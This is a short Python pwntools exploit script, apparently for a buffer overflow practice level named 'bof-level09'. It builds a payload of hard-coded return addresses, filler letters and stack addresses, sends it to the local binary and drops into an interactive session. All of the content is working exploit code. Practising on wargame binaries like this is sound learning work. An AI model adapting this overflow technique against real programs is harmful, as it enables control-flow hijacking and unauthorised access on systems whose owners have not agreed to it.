#!/usr/bin/env python
from pwn import *

######################################################
padding = '\x2b\x85\x04\x08'

padding += '\x2b\x85\x04\x08'

for letter in 'bcdefghijklmnopqrstuvwxyzABCD':
  padding += letter*4

padding += '\xdc\xd4\xff\xff'

padding += '\xd8\xd4\xff\xff'

#padding = bytearray(padding, 'utf-8')

#with open('input.txt', 'wb') as f:
#  f.write(padding)

#for letter in 'GHIJKLMNOPQRSTUVWXYZ':
#  padding += letter*4

payload = padding
######################################################

context.terminal = ['tmux', 'splitw', '-h'] 

target = process('./bof-level09')
#target = process('./bof-level09', setuid=False)
#gdb.attach(target, f'b *main+103')

target.send(payload) 

target.interactive()
